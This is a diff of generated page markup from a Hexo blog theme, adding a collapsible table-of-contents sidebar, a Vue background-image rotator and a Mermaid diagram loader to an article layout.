+    <!-- 打赏 -->
+    
+
+    <!-- 分享 -->
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
   </div>
 
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fas fa-list-ul" aria-hidden="true"></i><span>本文目录</span>
+        
+          <div class="toc-open-close">本文目录</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 手机端目录按钮 -->
+  <div id="toc-mobile-btn">
+    <i class="fas fa-list-ul" aria-hidden="true"></i>
+  </div>
+
+
+<script>
+  function closeToc(init) {
+    $(".toc-aside").css({'width': 0, 'padding': 0, 'transition': init ?  'noe' : 'width 0.3s' });
+    $(".toc-content").css({'width': 0});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+    $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+  };
+  function openToc() {
+    $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+    $(".toc-aside").css({'width': '300px', 'padding': '0 10px', 'transition': 'width 0.3s'});
+    $(".toc-content").css({'width': '300px'});
+    $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+  }
+  function openBtnClickFn () {
+    let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+    let open = eval('' || 'true');
+    openOrCloseBtn.click(function() {
+      if (open) {
+        closeToc();
+        open = false;
+      } else {
+        openToc();
+        open = true;
+      }
+    });
+  };
+  openBtnClickFn();
+  initCloseTocWidth(true);
+
+  function initCloseTocWidth(init) {
+    if (window.innerWidth >= 992) {
+      let isClose = false;
+      isClose && closeToc(init)
+    }
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    $(".toc-aside").css({'transition': 'no'});
+  })
+  document.addEventListener('pjax:complete', function () {
+    openBtnClickFn();
+  })
+  
+</script>
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
 </div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"
+	:style="{'background-color': bgColor ? bgColor : 'transparent'}">
+	<transition-group tag="ul" :name="names">
+		<li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+			<img :src="image" class="bg-swiper-img no-lazy">
+		</li>
+	</transition-group>
+</div>
+<script>
+	var vm = new Vue({
+		el: '#appBgSwiper',
+		data: {
+			names: '' || 'fade' || 'fade', // translate-fade fade
+			mark: 0,
+			img: [],
+			bgColor: '',
+			time: null
+		},
+		methods: {   //添加方法
+			change(i, m) {
+				if (i > m) {
+					// this.names = 'fade';
+				} else if (i < m) {
+					// this.names = 'fade';
+				} else {
+					return;
+				}
+				this.mark = i;
+			},
+			prev() {
+				// this.names = 'fade';
+				this.mark--;
+				if (this.mark === -1) {
+					this.mark = 3;
+					return
+				}
+			},
+			next() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			autoPlay() {
+				// this.names = 'fade';
+				this.mark++;
+				if (this.mark === this.img.length) {
+					this.mark = 0;
+					return
+				}
+			},
+			play() {
+				let bgImgDelay = '' || '180000'
+				let delay = parseInt(bgImgDelay) || 180000;
+				this.time = setInterval(this.autoPlay, delay);
+			},
+			enter() {
+				clearInterval(this.time);
+			},
+			leave() {
+				this.play();
+			}
+		},
+		created() {
+			this.play()
+		},
+		beforeDestroy() {
+			clearInterval(this.time);
+		},
+		mounted() {
+			let prop = '' || '#ffffff';
+			let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://')
+			if (isImg) {
+				let img = prop.split(',');
+				let configRoot = '/'
+				let arrImg = [];
+				img.forEach(el => {
+					var Expression = /http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+					var objExp = new RegExp(Expression);
+
+					if (objExp.test(el)) {
+						// http or https
+						arrImg.push(el);
+					} else {
+						// 非http or https开头
+						// 本地文件
+						let firstStr = el.charAt(0);
+						if (firstStr == '/') {
+							el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+						}
+						el = configRoot + el;
+						arrImg.push(el);
+					}
+				})
+				this.img = arrImg;
+			} else {
+				this.bgColor = prop;
+			}
+		}
+	})
+</script>
+
+<style>
+	.bg-swiper-box {
+		position: absolute;
+		display: block;
+		width: 100%;
+		height: 100%;
+	}
+
+	.bg-swiper-img {
+		object-fit: cover;
+		width: 100%;
+		height: 100%;
+	}
+</style>
+
+
+
+
+  <script>
+  function loadMermaid() {
+    if (document.getElementsByClassName('mermaid').length) {
+      if (window.mermaidJsLoad) mermaid.init()
+      else {
+        loadScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+          window.mermaidJsLoad = true
+          mermaid.initialize({
+            theme: 'default',
+          })
+          if ('true') {
+            mermaid.init();
+          }
+        })
+      }
+    }
+  };
+  document.addEventListener("DOMContentLoaded", function () {
+    loadMermaid();
+  })
+
+  document.addEventListener('pjax:complete', function () {
+    loadMermaid();
+  })
+  
+</script>
+
 
       </main>
     </div>
